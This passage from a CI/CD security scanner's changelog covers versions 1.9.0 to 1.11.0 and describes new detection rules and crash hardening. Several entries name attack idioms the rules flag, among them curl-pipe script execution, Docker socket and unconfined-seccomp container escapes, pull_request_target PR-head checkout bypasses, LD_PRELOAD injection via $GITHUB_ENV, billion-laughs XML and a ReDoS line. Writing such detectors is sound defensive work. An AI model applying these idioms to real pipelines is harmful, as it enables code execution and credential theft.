  `except json.JSONDecodeError` / `except tomllib.TOMLDecodeError` /
  `except yaml.YAMLError`) in ~21 context-build loaders that run before
  the per-check guard, so a malformed or pathologically deep repo file
  could abort the whole scan with a raw traceback. Hardened the JSON
  loaders (CloudFormation templates, Terraform plans, OCI manifests +
  attestations, npm `package.json` / lockfiles, Composer, devenv JSONC,
  the SARIF `--ingest` parser, FP-annotation and baseline readers), the
  TOML loaders (Cargo, the Gradle version catalog, config files), and the
  GitLab `include:` resolvers, plus the Terraform plan reader (which had
  no error handling at all). A new `tests/test_loader_robustness.py`
  fuzz + differential harness drives every loader with a deterministic
  battery (deep nesting, alias bombs, non-UTF-8 bytes, truncation, wrong
  top-level type, empty) and asserts the scan degrades rather than
  crashes, so a future loader can't reintroduce the gap.
- **A deeply-nested YAML file no longer crashes the scan.** PyYAML's
  parser is recursive, so a pathologically deep document (>= ~327 levels
  of nesting) raised a `RecursionError` straight out of the loader during
  context construction, before the per-rule guard, aborting the whole
  scan with a raw traceback. A scanned PR could weaponize this. The
  shared YAML loaders (`load_yaml_files` plus the kubernetes,
  cloudformation, and helm parse paths) now treat `RecursionError` /
  `MemoryError` like a parse failure and skip the file with a warning,
  the same degrade-don't-crash behavior the malformed-input hardening
  established. JSON-based and Dockerfile providers were never affected.
- **Insecure package-install detection widened (cross-provider).** The
  shared `PKG_INSECURE_RE` (the `*-018` insecure-package-source rules across
  GitHub, GitLab, Azure, Bitbucket, CircleCI, Jenkins, plus the Argo /
  Buildkite / Drone / Tekton variants) missed pip's equals form
  (`--index-url=http://`, `--extra-index-url=http://` — only the
  space-separated form matched) and npm/yarn `--strict-ssl=false` /
  `--strict-ssl false` (disables TLS cert verification for the install).
  Both are now flagged; `https://` sources and `--strict-ssl=true` stay
  clean.
- **CB-001 docs now match what it detects.** The CloudFormation and
  Terraform CB-001 (plaintext-secret CodeBuild env var) `docs_note`s listed
  a stale subset of credential shapes ("AKIA/ASIA, GitHub tokens, JWTs")
  while the check has long matched the full shared credential-shape catalog
  (`_patterns.SECRET_VALUE_RE` over `_BUILTIN_PATTERNS`, the same 49 shapes
  GHA-008 uses: GitLab `glpat-`, npm `npm_`, Docker `dckr_pat_`, Slack
  `xox*`, and the rest). The docs now describe the catalog instead of an
  out-of-date hand-list, so a reader isn't told a `glpat-` / `npm_` token in
  a plaintext env var slips through when it does not. Detection unchanged.

- **Docker container-escape detection widened (cross-provider).** The
  shared `DOCKER_INSECURE_RE` (GHA-017, ADO-017, BB-013, CC-017, GL-017,
  JF-017, BK-005, all CRITICAL/HIGH) missed several escape idioms: the
  Docker socket mounted to a non-canonical target (`-v
  /var/run/docker.sock:/sock`), the `--volume` long form, `--ipc=host`,
  and `--security-opt seccomp=unconfined` / `apparmor=unconfined`
  (sandbox disabled). All are now flagged across every provider that
  reuses the pattern; benign mounts (`-v ./data:/data`, `-p 8080:80`)
  remain clean.

- **Tekton, Argo, Buildkite, and Drone literal-secret rules now use the
  full token catalog.** TKN-005, ARGO-006, and BK-002 matched only a
  hand-maintained six-pattern subset (AWS / `ghp_` / `gho_` / broad `sk-` /
  JWT) for value-shape detection, and DR-004 matched AWS `AKIA` keys only,
  so a hardcoded GitLab PAT, Anthropic / OpenAI key, Docker Hub PAT, npm /
  PyPI token, or any of the other 40+ vendor formats sitting in one of
  those providers' `env:` / `settings:` values under an innocuous name
  slipped through. All four now run value-shape detection through the
  shared `_secrets.find_secret_values` catalog (49 detectors), the same one
  the `*-008` literal-secret rules already use, while keeping their existing
  key-name heuristics and FP guards. (The `*-003` family is name/field-based
  over `variables:` blocks and intentionally complements the value-shape
  `*-008` rules, so it's unchanged.)

- **GHA-046 now catches more manual PR-head fetch bypasses (critical
  false-negatives).** The manual-fetch companion to GHA-002 (CRITICAL,
  fires on `pull_request_target` / `workflow_run`) missed two forms: a
  `git fetch origin pull/<n>/{head,merge}` where `<n>` is an expression
  (`pull/${{ github.event.number }}/merge`) rather than literal digits,
  and `git checkout ${{ github.event.pull_request.merge_commit_sha }}`
  (the merge commit contains the PR's code). Both are now detected;
  non-PR refs (`git fetch origin main`, `pull/abc/head`) stay clean.

- **GHA-002 now catches more PR-head checkout bypasses (critical
  false-negatives).** The flagship `pull_request_target`-checks-out-PR-head
  rule (CRITICAL) matched `head.sha` / `head.ref` / `github.head_ref` but
  missed two documented bypass forms that still run attacker code with a
  write-scope token and secrets: `github.event.pull_request.merge_commit_sha`
  (the auto-generated merge commit *contains* the PR's code) and the literal
  `refs/pull/<n>/head` / `refs/pull/<n>/merge` refs (often written as
  `refs/pull/${{ github.event.number }}/merge`). The shared
  `PR_HEAD_REF_RE` now covers all of them, so GHA-002 (and GHA-058, which
  reused a narrower private copy now unified onto the shared pattern) flag
  these checkouts. Safe refs (`github.sha`, `refs/heads/...`) are
  unaffected.

- **Tekton findings now carry source locations.** The per-step Tekton
  rules (TKN-002 privileged step, TKN-003 parameter injection) attributed
  their offenders through `job_anchors` (`<Kind>/<name>:<step>`) and set no
  `Location`, so they reached the terminal report, SARIF, the blast-radius
  heatmap, and the new pipeline graph with no file or line. The Tekton
  orchestrator now resolves those anchors back to a document and step line
  in one place (`TektonChecks.run`), matching the `Location` shape TKN-001
  already sets natively. Detection, severity, and finding counts are
  unchanged; findings that already carry locations or have no anchors are
  left untouched. The aggregate Tekton rules (TKN-004/005/006/007/008/009/
  010/011/013/014/015) now also attach a `Location` per offending document
  via a shared `tekton/base.py::doc_location(doc, obj)` helper, so the whole
  Tekton provider emits located findings (TKN-012 is a whole-scan
  "no vulnerability scanner anywhere" finding with no resource to point at).
- **Argo Workflows findings now carry source locations.** Same fix as the
  Tekton one, applied to Argo: the per-template rules (ARGO-005 parameter
  injection, ARGO-017 resource manifest injection) attributed offenders
  through `job_anchors` (`<Kind>/<name>:<template>`) and set no `Location`.
  `ArgoChecks.run` now resolves those anchors to a document and template
  line (ARGO-001 / ARGO-002 already set locations natively), so the
  findings carry file/line info in the terminal report, SARIF, the heatmap,
  and the new pipeline graph. The aggregate Argo rules (ARGO-003/004/006/
  007/008/009/010/011/013/014/015/016) now also attach a `Location` per
  offending document via a shared `argo/base.py::doc_location(doc, obj)`
  helper, so the whole Argo provider emits located findings (ARGO-012 is a
  whole-scan "no vulnerability scanner anywhere" finding with no resource
  to point at). With the Kubernetes and Tekton fixes, every K8s-CRD
  provider now emits located findings.
- **Every Kubernetes finding now carries a source location.** The
  aggregate Kubernetes rules returned one Finding per check with
  `resource="kubernetes/manifests"` and no `Location`, so they showed no
  file or line in the terminal report, SARIF (GitHub code-scanning
  annotations had nowhere to land), or the blast-radius heatmap. A shared
  `manifest_location(manifest, obj)` helper now builds a `Location` (with
  `doc_index` for multi-doc files) at the offending site, and all 23 rules
  that previously omitted one attach a location per offender: the
  workload-level rules (pod-security K8S-002/003/004/007/008/009/010, plus
  K8S-011/012 service-account, K8S-014 hostPath, K8S-015/016 resource
  limits, K8S-017 env credential, K8S-024 probes, K8S-025 priority class,
  K8S-028 hostPort, K8S-030 control-plane scheduling) and the
  manifest-level rules (K8S-019 default namespace, K8S-022 SSH service,
  K8S-023 pod-security admission, K8S-027 ingress TLS, K8S-029 default-SA
  binding, K8S-044 admission webhook). Detection, severity, and finding
  counts are unchanged. The remaining document-level Tekton / Argo rules
  are tracked as the next batch.
- **A crashing rule no longer aborts the whole scan.** Rules run over
  config the scanner didn't author, and a single rule tripping over an
  unexpected YAML shape used to raise straight out of the orchestrator and
  kill the scan (no findings, non-zero exit). A scanned PR could weaponize
  this: one malformed workflow file suppressed every finding. `discover_rules`
  now wraps each check so an unhandled exception degrades to a logged warning
  plus a passing finding, and the scanner loop guards provider context
  construction (e.g. a malformed Terraform plan) so one provider's failure
  doesn't drop the others in a multi-provider run. The AWS / GCP / Azure /
  CloudFormation / Terraform orchestrators `extend` a `list[Finding]` from
  each check; their call sites now normalize the guard's single-finding
  degrade through `as_finding_list` so a lone crashing rule degrades to one
  finding instead of raising `TypeError` and dropping the whole provider.
- **GHA-002 / GHA-003 / GHA-004 / GHA-011 crashes on malformed workflows.**
  GHA-002 and GHA-004 raised `AttributeError` on a scalar `with:` block
  (`with: ref` instead of a mapping); GHA-003 raised `re.error` when an
  `env:` key contained a regex metacharacter (the env-var name was
  interpolated into a pattern without `re.escape`, unlike its sibling rules);
  GHA-011 raised `TypeError` on a numeric `key:` (`key: 123`). All four now
  handle the off-shape input instead of crashing.
- **Autofix no longer writes a duplicate mapping key.** When a sibling key
  (`name:`, `if:`) sat between `uses:`/`run:` and the `with:`/`env:` block,
  the GHA-002 and GHA-003 fixers inserted a *second* `with:`/`env:` mapping
  instead of merging into the existing one. The round-trip safety gate used a
  lenient loader (last-wins) that accepted the corruption, so it reached disk
  under `--fix --apply` and silently dropped the original value. The fixers
  now merge correctly, and the gate uses the strict duplicate-key loader so
  any future duplicate-emitting fixer bails to "no patch" instead of
  corrupting the file.
- **OSV fetcher crash on null fields (`--resolve-remote`).** A vulnerability
  record with an explicit `"aliases": null` or `"severity": null` raised
  `TypeError` (`dict.get(key, default)` only substitutes the default for a
  *missing* key, not a present-but-null one). Both are now treated as empty.
- **Maven POM parsing hardened against entity-expansion DoS.** `pom.xml` /
  `settings.xml` were parsed with stdlib ElementTree and no size guard
  (unlike the NuGet loader). A crafted `<!DOCTYPE>` with nested `<!ENTITY>`
  definitions (a "billion laughs" payload) could exhaust memory. POM bodies
  carrying a DTD, or above a ~10M-character cap, are now refused
  (`parsed_ok=False`) before parsing; a POM never legitimately needs a DTD.
- **SARIF regions no longer omit `startLine`.** A `Location` can carry a
  column or end position without a start line; the region builder emitted
  `startColumn` / `endLine` / `endColumn` with no `startLine`, which GitHub
  code scanning rejects as invalid. The column/end fields are now emitted
  only alongside a `startLine`; a column-only location degrades to a
  file-level result.
- **JUnit XML strips XML-forbidden control characters.** A finding field
  carrying a C0 control byte (a NUL or similar lifted from scanned file
  content) passed through `saxutils` unescaped and produced non-well-formed
  XML that CI ingestors reject. Control characters (except tab / LF / CR)
  are now stripped before escaping.
- **Non-UTF-8 config / ignore / repo-list files no longer crash the run.**
  The config loaders (`.pipeline-check.*` and the `pyproject.toml` section),
  both ignore-file loaders (flat + YAML), the inline-ignore scanner, the gate
  baseline loader, and the fleet `--repos` loader caught `OSError` but not
  `UnicodeDecodeError` (a `ValueError`), so a latin-1 / cp1252 file aborted
  the process with a traceback before scanning. These reads now degrade
  cleanly (skip the file with a warning, or raise a usage error). Because
  these run outside the per-rule guard, the crash was process-fatal.
- **Report writes to a bad `--output-file` give a clean error.** Writing
  JSON / SARIF / JUnit / HTML / etc. to a directory path, a missing parent
  directory, or a read-only destination raised a raw `OSError`; it is now a
  `click.UsageError`. Unbalanced quotes in `fleet --scan-flags` likewise
  surface as a usage error instead of a `shlex` traceback.
- **`.get(key, default)` null-value crashes.** Several sites relied on a
  two-arg `.get` defaulting a *missing* key, but an explicit `null` returns
  None and crashed: the OSV fetcher on a non-object JSON response
  (`--resolve-remote`), and the CloudFormation S3-005 / ECR-003 policy checks
  on a `"Statement": null` (which silently disabled those public-access
  checks via the per-rule guard). The SCM loader's GitLab `repository_size`
  coercion and the Argo CD `ApplicationSet` source walk are likewise guarded
  against a non-numeric value and a list-shaped `spec:`.

## [1.11.0] - 2026-06-06

### Added

- **HTML report: step-level pipeline graph for GitLab, CircleCI, Cloud
  Build, and Drone (DAG v2).** The HTML report now renders these as
  layered job graphs, each node colored by the worst finding that lands
  on it, extending the step-level DAG that previously covered only GitHub
  Actions. GitLab (`.gitlab-ci.yml`): jobs as nodes, `needs:` as edges,
  and stage ordering as edges for jobs without explicit `needs`. CircleCI
  (`.circleci/config.yml`): jobs and their steps as nodes, with the
  `workflows.<name>.jobs[].requires` references (unioned across every
  workflow) as edges. Cloud Build (`cloudbuild.yaml`): each build step as
  a node, with `waitFor` as the DAG and a sequential chain for steps that
  omit it. Drone (`.drone.yml`): each step as a node, with `depends_on`
  as the DAG (or a sequential chain when none is declared), and one graph
  per `kind: pipeline` document in the multi-document file. Each is a new
  `checks/<provider>/_graph.py` builder with no contract change, so every
  other reporter and provider is unchanged. Pure inline SVG, no JS / CDN
  / network.
- **`scan_status` in the JSON and SARIF outputs.** The terminal report
  already flags an incomplete scan (a file that failed to parse, a
  credential-less cloud probe) instead of presenting a confident grade,
  but the machine-readable outputs did not, so a CI consumer could not
  tell a fully-completed scan from a partial one. JSON gains a top-level
  `scan_status` object and SARIF a run-level `properties.scan_status`,
  both carrying `complete`, `files_scanned`, `files_unparsed`,
  `degraded_modules`, and a `reason` when incomplete.
- **`--fail-on-parse-error` gate.** Opt-in CI gate that fails the run when
  any file could not be parsed (malformed YAML / JSON, read error), so a
  scan that silently skipped part of its input is treated as a failure
  rather than a clean pass. Layers on top of the existing gate conditions
  (it does not disable the default `--fail-on CRITICAL` floor); the count
  it acts on is the same one surfaced in `scan_status.files_unparsed`.

### Changed

- **Faster startup: heavy imports are deferred.** The single-format
  reporters (JUnit, SARIF, Markdown, CodeQuality, threat-model, HTML)
  were imported at CLI load, so every invocation, including `--version`
  and `--list-*`, paid for them. They now import lazily when their format
  is actually selected. The headline win is the JUnit reporter pulling in
  `xml.sax` (~20 ms off every run). The autofix engine's `difflib`
  dependency is likewise deferred to where a patch is actually rendered
  (under `--fix`), since the fix engine is otherwise on every CLI load.
  CLI import drops from ~150 ms to ~114 ms.
- **Attack-chain reports distinguish the two reachability tiers.** A
  chain confirmed only by the shared-job co-location fallback
  (`via_dataflow=False`) used to render the same confident green
  `Reachability confirmed` badge as a chain backed by a proven
  source-to-sink dataflow path. Co-location is not a proven path, so the
  terminal / Markdown / HTML reports now show it as a weaker caution
  badge (`Co-located (unverified)`) and reserve `Reachability confirmed
  (dataflow)` for the proven tier. The SARIF chain result also gains a
  `via_dataflow` property so machine consumers can gate on the stronger
  signal (mirroring `--chains-require-dataflow`). The underlying
  `confirmed_reachable` flag and which chains emit are unchanged.

### Fixed

- **ReDoS in the remote-script-exec primitive.** The curl-pipe detector
  (`_primitives/remote_script_exec`, used by the GHA-016 / GL-016 /
  BB-012 / ADO-016 / ... curl-pipe rules) used unbounded fills around the
  captured URL. A crafted CI line such as `curl https://x/<60 000 chars>`
  with no trailing pipe drove the engine into quadratic backtracking
  (~5 s per pattern at 60 kB; ~11 s at 80 kB). Since these patterns run
  on pull-request-controlled workflow files, that was a denial-of-service
  vector against the scanner itself. The URL body and every fill are now
  length-capped (`_MAX_FILL`, 2048), so a crafted long line scans in
  ~15 ms with no change to detection on real command lines. Regression
  test in `tests/test_primitives.py::TestRemoteScriptExecReDoS`.

## [1.10.0] - 2026-06-05

### Added

- **HTML report: step-level pipeline graph (DAG v2), GitHub.** The HTML
  report now renders each GitHub Actions workflow as a layered jobs ->
  steps SVG: jobs and steps are nodes, `needs:` are edges, and each node
  is colored by the worst finding that lands on it (mapped by source
  line, with a job / file fallback for line-less findings). Only pipelines
  that have findings render, worst-load first, with a severity legend and
  a count of any files elided beyond the display cap. It sits above the
  resource-level blast-radius heatmap, which still ranks every resource.
  Pure inline SVG, no JS / CDN / network. The Scanner now
  exposes a `pipeline_graphs` attribute (built from the retained provider
  context, like `chains`); only the HTML reporter consumes it, so every
  other reporter is unchanged. This is the first increment of the
  step-level "DAG v2" lift of the v1 heatmap; the remaining pipeline
  providers (GitLab, Azure, ...) follow as additive `_graph.py` builders
  with no contract change.
- **IAM-009: Azure federated identity credential trusts a broad GitHub
  subject (HIGH, Terraform).** Tier 2 of the 2026-06-04 high-impact
  sweep, the OIDC-trust-in-IaC batch. Fires on an
  `azurerm_federated_identity_credential` whose `issuer` is the GitHub
  Actions OIDC issuer and whose `subject` wildcards the org/repo segment
  (`repo:org/*`), wildcards the ref segment (`repo:org/repo:*`), or uses
  the `pull_request` context, so a fork PR can exchange its GitHub token
  for the Azure identity. Azure Workload Identity Federation is the Azure
  analogue of the AWS OIDC trust IAM-008 audits and was previously
  uncovered (GHA-062 documents Azure as deliberately excluded). Reuses
  the shared `github_repo_sub_too_broad` subject helper.
- **IAM-010: GCP workload identity provider has no repository attribute
  condition (HIGH, Terraform).** Tier 2 of the 2026-06-04 high-impact
  sweep. Fires on a `google_iam_workload_identity_pool_provider` with an
  `oidc` block that has no `attribute_condition` (any identity the issuer
  mints can federate), or, for the GitHub / GitLab CI issuers, a
  condition that never references the repository, so it doesn't constrain
  which repo can assume the identity. GHA-062 audits this from a
  workflow's sibling files; IAM-010 reads the Terraform resource directly.
- **DEV-006: VS Code settings point a tool at a repo-local binary
  (HIGH).** Tier 2 of the 2026-06-04 high-impact sweep. The devenv
  loader now also reads `.vscode/settings.json`. DEV-006 fires when a
  committed workspace settings file points an executable-path key
  (`git.path`, `python.defaultInterpreterPath`, `eslint.runtime`,
  `go.alternateTools`, a terminal automation profile, ...) at a
  repo-relative path, injects a `terminal.integrated.env.*`
  process-hijack variable (`PATH` / `LD_PRELOAD` / `NODE_OPTIONS`), or
  enables `task.allowAutomaticTasks`. The moment a developer opens the
  checkout in VS Code (and trusts the workspace), VS Code launches the
  repo-shipped binary as the tool: checkout-time RCE, the same
  second-stage shape DEV-001..005 cover, on a file the loader did not
  previously read. A bare command (resolved from `PATH`) or an absolute
  system path passes. devenv 5 -> 6.
- **GL-042: `include: component:` pulls a CI/CD component without a
  pinned version (HIGH).** Tier 2 of the 2026-06-04 high-impact sweep.
  GitLab CI/CD components are third-party pipeline code merged into the
  consumer's pipeline before any job runs. Fires when the
  `include: component: <host>/<path>@<version>` version is mutable
  (`~latest`, a branch, a floating major / minor like `1` / `1.2`, or
  missing); a full `X.Y.Z` release tag or a 40-char commit SHA pass.
  Whoever controls the component project can re-point a mutable version
  and run arbitrary `script:` in every consumer's next pipeline with its
  `CI_JOB_TOKEN` and CI/CD variables. Novel: GL-005 walks only
  `project:` / `remote:` includes and GL-030 only `trigger:` includes;
  neither inspects the newer component surface. gitlab 43 -> 44.
- **DF-031: `COPY --from=<external image>` not digest-pinned (HIGH).**
  Tier 2 of the 2026-06-04 high-impact sweep. Fires when a `COPY` / `ADD`
  carries `--from=<X>` where `X` is an external image reference (it has a
  registry / tag / digest separator and is not an earlier
  `FROM ... AS <stage>` name or a numeric stage index) and `X` is not
  `@sha256:`-pinned. `--from=<image>` pulls that image at build time and
  copies bytes out of it into the final image (a common way to grab
  `cosign` / `kubectl` / a CA bundle), so a floating tag lets the
  registry serve different content and a typosquat / takeover ships an
  attacker's binary straight into the build. DF-001 only inspects `FROM`,
  so this sidesteps it; reuses the shared `image_pinning` classifier. A
  named / numbered stage and a bare build-context name don't fire.
  dockerfile 30 -> 31.
- **K8S-044: admission webhook fails open or mutates cluster-wide
  unscoped (HIGH).** Tier 2 of the 2026-06-04 high-impact sweep. Fires on
  a `MutatingWebhookConfiguration` / `ValidatingWebhookConfiguration`
  whose webhook either (a) sets `failurePolicy: Ignore` while its `rules`
  match a broad target (`pods` / `*` resources or `*` apiGroups), so an
  attacker who DoSes or deletes the backend silently disables the
  admission control cluster-wide (the v1 default is `Fail`), or (b) is a
  mutating webhook with no `namespaceSelector` and no `objectSelector` and
  broad rules, so whoever controls the backend rewrites every pod spec in
  the cluster (inject a sidecar, add `hostPID`) - a tenant-escape
  primitive. Novel: RBAC rules (K8S-020 / 021) reason about who can call
  the API; webhooks intercept every call regardless, and no other rule
  reads `admissionregistration.k8s.io` objects. kubernetes 43 -> 44.
- **ARGOCD-019: Argo CD Application disables drift detection on a
  sensitive field (HIGH).** Tier 2 of the 2026-06-04 high-impact sweep.
  Fires when an Application (or ApplicationSet template) sets
  `syncPolicy.syncOptions: [Validate=false]`, or carries a
  `spec.ignoreDifferences` entry whose `jsonPointers` / `jqPathExpressions`
  / `kind` references a security-relevant field (container `image`, RBAC
  `rules` / `subjects` / `roleRef`, `securityContext`, host namespaces,
  service account, capabilities). Both tell Argo CD to stop enforcing the
  field's desired state, so an out-of-band edit (a backdoored image, a
  widened ClusterRole) persists in the live cluster while the dashboard
  stays Synced / Healthy: stealth persistence sanctioned by the GitOps
  controller. A non-security `ignoreDifferences` (a replica count, a
  webhook-injected annotation) does not fire. Distinct from ARGOCD-003
  (prune / selfHeal) and ARGOCD-010 / 017 (mutable source ref), which
  reason about the input rather than the controller ignoring its output.
  argocd 18 -> 19.
- **GL-041: IaC apply on an untrusted merge-request trigger.** The
  GitLab analog of GHA-117. Fires when a job runs an unattended IaC
  apply (`terraform`/`terragrunt apply` or `destroy`, `aws
  cloudformation deploy`/`create-stack`/`update-stack`/
  `execute-change-set`, `cdk deploy`, `pulumi up`, `sam deploy`) AND
  the job is reachable on a merge-request pipeline (its own `rules:`
  admit `merge_request_event`, its legacy `only:` includes
  `merge_requests`, or it inherits a `workflow:` that admits MR
  pipelines). Applying an MR author's IaC executes attacker code at
  apply time (an `external` data source, a `local-exec` provisioner, a
  hijacked provider) on the runner with whatever cloud credentials
  (often an OIDC role via `id_tokens:`) the apply uses, before the
  change is reviewed or merged. The plan/apply-on-untrusted-input RCE
  class. GL-004 already caught this as a generic ungated deploy
  (MEDIUM); GL-041 names the apply-RCE shape and raises it to CRITICAL.
  Closes cicd-goat scenario 91. The IaC-apply command vocabulary now
  lives in the shared `_primitives/deploy_names.IAC_APPLY_RE` (GHA-117
  refactored to consume it). gitlab 42 -> 43.
- **High-impact provider checks (2026-06-04 cross-provider sweep), batch
  1.** Four net-new, high-severity rules a multi-provider audit surfaced
  as genuine blind spots, each verified against the live rule pack (the
  closest existing rules are cited so the novelty is auditable):
  - **ARGO-017 (CRITICAL): Argo `resource` template applies a manifest
    built from an untrusted parameter.** A `resource:` template with
    `action: create` / `apply` / `patch` / `replace` and a
    `{{inputs.parameters.X}}` / `{{workflow.parameters.X}}` / `{{item}}`
    token inside `manifest:` lets a caller inject arbitrary K8s objects
    (a privileged Pod, a cluster-admin RoleBinding) applied by the
    workflow's ServiceAccount, cluster takeover even without ARGO-016's
    cluster-admin SA, and ARGO-005's shell-quoting defenses don't apply
    (the sink is the YAML object structure). `iter_containers` never
    visits `resource` templates, so no other Argo rule sees this sink.
    argo 17 -> 18.
  - **NPM-019 (HIGH): `overrides` / `resolutions` rewrites a dependency
    to a non-registry source.** npm `overrides` (Yarn `resolutions`,
    `pnpm.overrides`, walked recursively) force-replace any transitive
    package's version / source ahead of the lockfile, from one line a
    reviewer doesn't scan. Flags a git / URL / `file:` / `npm:`-alias
    target; a plain version override (the legitimate use) passes. The
    npm manifest rules only walk the `*dependencies` blocks via
    `iter_manifest_dependencies`, so none saw the override map.
  - **NPM-020 (HIGH): `.npmrc` repoints the default or a scoped registry
    to a non-canonical host.** The npm config-layer dependency-confusion
    rule (the analog of PYPI-016 / COMPOSER-012 / CARGO-012). NPM-007
    reads the same `.npmrc` but only the `ignore-scripts` key; NPM-003
    treats any HTTPS registry host as safe. Leans on suppression for
    legitimate internal mirrors. npm 18 -> 20.
  - **GHA-118 (HIGH): untrusted content written to `$GITHUB_ENV` /
    `$GITHUB_PATH`.** On an untrusted trigger (`pull_request` /
    `pull_request_target` / `workflow_run` / `issue_comment`), a `run:`
    step that pipes file / command output, or sets a process-hijack key
    (`LD_PRELOAD` / `NODE_OPTIONS` / `BASH_ENV` / `PYTHONPATH`), into the
    env-control file escalates a benign later step to code execution, the
    file-channel successor to the retired `::set-env::`. GHA-038 only
    catches the legacy stdout channel, GHA-019 only the secret-exfil
    direction, and GHA-003 / TAINT only the `${{ }}` / `$GITHUB_OUTPUT`
    channels. github 108 -> 109. Tier 2/3 of the sweep are queued in
    `ROADMAP.md`.
- **Fleet posture-graph HTML view (`fleet.html`).** A fleet scan now
  writes a self-contained `fleet.html` next to `fleet.json` / `fleet.md`,
  rendering the cross-repo `posture_graph` as a static SVG node-link
  diagram: repos are nodes colored by grade, cross-repo (`CXPC-NNN`)
  attack chains are directed producer-to-consumer edges colored by
  severity, and a chain endpoint outside the scanned fleet renders as a
  dashed, muted node. Above the graph, a ranked card grid shows every
  repo's grade, score, and per-severity failed-finding breakdown. The
  layout is computed in Python so the output is deterministic; there is
  no JavaScript, no CDN, and no network (the shared `_design_tokens.css`
  palette keeps it in sync with the HTML report and the docs site). This
  completes the SDLC posture-graph roadmap item whose JSON contract
  shipped in v1.8.0.
- **Docs: Fleet (org-wide) scanning guide.** `pipeline_check fleet`
  was only mentioned in passing on the docs site (under the cross-repo
  attack-chains page). It now has its own page covering `--repos` /
  `--from-org`, the `--include` / `--exclude` / `--jobs` /
  `--scan-flags` / `--per-repo-timeout` flags, the output tree
  (`fleet.json` / `fleet.md` + per-repo `findings.json`), the
  `posture_graph` JSON shape, and the `CXPC-NNN` cross-repo chains.
  Surfaced in the nav and as a home-page feature card, alongside a new
  "supply-chain depth on demand" card spotlighting the
  `--resolve-remote` checks (cooldown / OSV / OpenSSF Scorecard /
  provenance / live secret verification).

### Changed

- **IAM-008 now flags a present-but-broad OIDC subject (HIGH).** Tier 2
  of the 2026-06-04 high-impact sweep. The shared `oidc_subject_pinned`
  helper previously treated any non-bare-`*` `...:sub` as pinned, so an
  org wildcard (`repo:org/*`), a ref wildcard (`repo:org/repo:*`), and the
  `pull_request` context all passed. They now fail across the AWS
  (runtime), Terraform, and CloudFormation IAM-008 paths, since a fork PR
  via `pull_request_target` can mint the role's token. A subject pinned to
  a specific repo AND ref/environment still passes.
- **Docs: refreshed the cicd-goat cross-scanner benchmark numbers.**
  The upstream [`greylag-ci/cicd-goat`](https://github.com/greylag-ci/cicd-goat)
  testbed grew from a 38-scenario GHA + npm matrix to 120 scenarios
  across 16 providers and formats. `docs/goat_bench.md` now carries the
  current GitHub Actions leaderboard (pipeline-check 37/43, ahead of
  zizmor 17, poutine 14, octoscan 13, Checkov 10, KICS 8, actionlint 6)
  and the cross-provider standing (top scorer in 14 of 16 categories,
  sole leader in 11). `docs/comparison.md` gains a "Cross-scanner
  benchmark" section presenting the same measured results next to the
  self-reported feature matrix.
- **JUnit report: run-level grade / score moved from non-standard
  `data-*` attributes to standard `<properties>`.** The `<testsuites>`
  root previously carried `data-grade` / `data-score`, which is an HTML
  attribute convention, not JUnit, and strict schema-validating
  ingestors (some Azure DevOps / Jenkins publishers) reject unknown
  attributes. The grade and score now travel as
  `<property name="pipeline-check.grade" .../>` /
  `pipeline-check.score` inside each suite's `<properties>` block, the
  portable slot every JUnit consumer understands. The SARIF and
  CycloneDX reporters are now validated in CI against the official
  SARIF 2.1.0 and CycloneDX 1.6 schemas, and the JUnit output against
  its structural contract, so spec drift is caught before release.

### Fixed

- **The terminal report no longer shows a confident "Grade A" on a
  degraded scan.** When a file could not be parsed (malformed YAML /
  JSON) or a cloud module failed API access, the headline now renders
  `Grade A (incomplete)` in a caution style with an `incomplete scan:
  ...` status line explaining that the grade covers only what was
  actually scanned. Previously a single unparseable file or a
  credential-less cloud probe could display `Score 100 / Grade A` next
  to a parse warning, which read as a clean pass. The JSON / SARIF
  outputs and the gate are unchanged for now (a `scan_status` field and
  an opt-in `--fail-on-parse-error` are tracked as follow-ups).
- **Config / ignore files using a YAML merge-key override are no longer
  silently dropped.** The strict loader (`DupKeyLoader`) flattened `<<:`
  merge keys before running its duplicate-key guard, so a valid
  `<<: *anchor` followed by a local override (a common DRY pattern)
  tripped the guard. The callers in `config.py` and `gate.py` catch the
  resulting parse error and fall back to an empty config, so the whole
  `.pipeline-check.yml` or YAML ignore file was discarded with only a
  stderr line, which could quietly weaken a configured CI gate. The
  guard now validates only explicitly-written keys and defers to stock
  merge-aware (last-wins) construction, so overrides load correctly while
  a genuine duplicate key still fails loudly.
- **The `pipeline-check` (hyphen) command now works.** Only the
  `pipeline_check` (underscore) console script was registered, but the
  PyPI package, Docker image, and every doc use the hyphenated name, so
  a user who ran the name they had just installed got "command not
  found". Both spellings now resolve to the same entry point.
- **Corrected eight British spellings** in rule metadata, docstrings, and
  comments (inflections of catalog, flavor, serialize, fulfill,
  neutralize, finalize) that the American-English drift test did not yet
  match. The enforcement list was extended so they cannot recur.

## [1.9.0] - 2026-06-03

### Added

- **`--no-best-practice` filter + best-practice rule classification.**
  The "missing-control" hygiene family (unbounded build / no timeout, no
  SBOM, no artifact signing, no SLSA provenance, no vulnerability-scan
  step) is structurally true but fires on most pipelines regardless of
  the specific vulnerability under review, so it dominates the findings
  list as low-signal noise. A curated central registry
  (`core/checks/_best_practice.py`) classifies these rules, and
  `--no-best-practice` drops them from the output and the gate so the
  result focuses on active-vulnerability findings. Severity and
  confidence are unchanged (confidence is false-positive likelihood, and
  these findings are true); this is purely an output filter, and the
  classification is extensible in one auditable place.
- **ARGO-016: Workflow bound to a cluster-admin / over-privileged
  ServiceAccount.** Fires when a `Workflow` / `CronWorkflow` sets
  `spec.serviceAccountName` to a name signaling a cluster-wide admin
  binding (`cluster-admin`, a name containing `cluster-admin`, or
  `admin` / `root` / `superuser`). Any step's automounted token then
  acts cluster-wide (read every secret, schedule privileged pods,
  bind more roles), the cluster-takeover shape. Name-based heuristic
  (MEDIUM confidence), since the privilege itself lives in RBAC; the
  broader case (an innocuously-named SA bound to cluster-admin) needs
  the RBAC manifest. Distinct from ARGO-003 (default SA). Closes
  cicd-goat scenario 92 (CICD-SEC-2).
- **GHA-117: unattended IaC apply on an untrusted `pull_request`
  trigger.** Fires when a workflow triggered by `pull_request` /
  `pull_request_target` runs `terraform apply` (or `terragrunt apply` /
  `cloudformation deploy` / `cdk deploy` / `pulumi up` / `sam deploy` /
  the `destroy` variants). Applying a PR author's IaC executes attacker
  code at apply time (an `external` data source, a `local-exec`
  provisioner, a hijacked provider) on the runner, with whatever cloud
  credentials (often an OIDC `id-token`) the apply uses. The
  plan/apply-on-untrusted-input RCE class; no scanner in the cicd-goat
  comparison catches it. Distinct from GHA-111, which requires an
  agentic CLI in the loop (CICD-SEC-4).
